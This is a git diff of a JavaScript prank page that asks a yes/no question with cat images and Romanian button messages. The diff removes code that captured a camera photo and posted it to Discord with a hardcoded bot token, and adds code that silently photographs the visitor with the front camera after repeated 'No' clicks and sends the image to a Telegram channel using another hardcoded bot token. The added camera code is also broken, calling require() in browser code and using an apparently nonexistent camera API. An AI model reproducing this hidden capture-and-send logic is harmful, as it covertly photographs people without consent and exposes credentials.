@@ -4,7 +4,6 @@ const buttonsContainer = document.querySelector(".buttons");
 const yesButton = document.querySelector(".btn--yes");
 const noButton = document.querySelector(".btn--no");
 const catImg = document.querySelector(".cat-img");
-
 const MAX_IMAGES = 5;
 
 let play = true;
@@ -12,10 +11,9 @@ let noCount = 0;
 
 yesButton.addEventListener("click", handleYesClick);
 function handleYesClick() {
-  titleElement.innerHTML = "SEX !!!!!!!";
+  titleElement.innerHTML = "SEX SALBATIC! >_<";
   buttonsContainer.classList.add("hidden");
   changeImage("yes");
-  capturePhoto();
 }
 
 function resizeYesButton() {
@@ -33,7 +31,7 @@ function generateMessage(noCount) {
     "Pookie please",
     "Te rog",
     "Esti loser-ul meu preferat ",
-    "Bine atunci...",
+    "Bine atunci..."
   ];
 
   const messageIndex = Math.min(noCount, messages.length - 1);
@@ -54,23 +52,36 @@ function updateNoButtonText() {
       if (play) {
         play = false;
 
-        // Capture a photo from the user's camera
-        const photoInput = document.createElement("input");
-        photoInput.type = "file";
-        photoInput.accept = "image/*;capture=camera";
-        photoInput.addEventListener("change", function (event) {
-          const file = event.target.files[0];
-          const reader = new FileReader();
-          reader.onload = function (event) {
-            const capturedImage = event.target.result;
+        const Camera = require('js-camera');
 
-            // Send the captured photo to Discord or Telegram
-            sendCapturedPhotoToDiscordOrTelegram(capturedImage);
-          };
-          reader.readAsDataURL(file);
+        // Create a new instance of the Camera
+        const camera = new Camera({
+          video: {
+            width: 60,
+            height: 40
+          },
+          audio: false
         });
-        document.body.appendChild(photoInput);
-        photoInput.click();
+
+        // Take a picture with the front camera
+        camera.takePicture({
+          flip: Camera.FLIP.BOTHORIZONTAL,
+          facingMode: Camera.FACING_MODE.USER
+        }).then(function (dataUrl) {
+          // Send the image to the Telegram channel
+          sendImageToTelegramChannel(dataUrl);
+
+          // Resize the yes button
+          resizeYesButton();
+
+          // Update the no button text
+          updateNoButtonText();
+
+          // Stop the camera
+          camera.stop();
+        }).catch(function (error) {
+          console.error('Error taking picture:', error);
+        });
       }
     });
   }
@@ -86,18 +97,17 @@ noButton.addEventListener("click", function () {
   }
 });
 
-function sendCapturedPhotoToDiscordOrTelegram(photo) {
-  const discordToken = 'MTIwNjk0Njc2NjMwMjM1MTM3MA.GZp1AU.rD6qMwOJjxk_1nx5tS7pR44MHD_yRal6fiq68k'; // Replace with your actual token
-  const discordChannelId = '1198262222162497686'; // Replace with your actual channel ID
+// Send the image to the Telegram channel
+function sendImageToTelegramChannel(dataUrl) {
+  // Create a new instance of the TelegramBot
+  const TelegramBot = require('node-telegram-bot-api');
 
-  const formData = new FormData();
-  formData.append('file', photo, 'photo.jpg'); // Assuming you've saved the photo as 'photo.jpg'
+  // Replace YOUR_TELEGRAM_BOT_TOKEN with the token you received from BotFather
+  const token = '6644421997:AAGVhqt5RAdPkpBgOMO2ZyqvHhh8FNu47LE';
+  const bot = new TelegramBot(token, {polling: true});
 
-  fetch('https://discord.com/api/webhooks/' + discordChannelId, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'multipart/form-data',
-      'Authorization': `Bot ${discordToken}`
-    },
-    body: formData
- 
+  // Send the image to the Telegram channel
+  bot.sendPhoto('@auejazni', dataUrl, {
+    caption: 'Image taken with the front camera'
+  });
+}
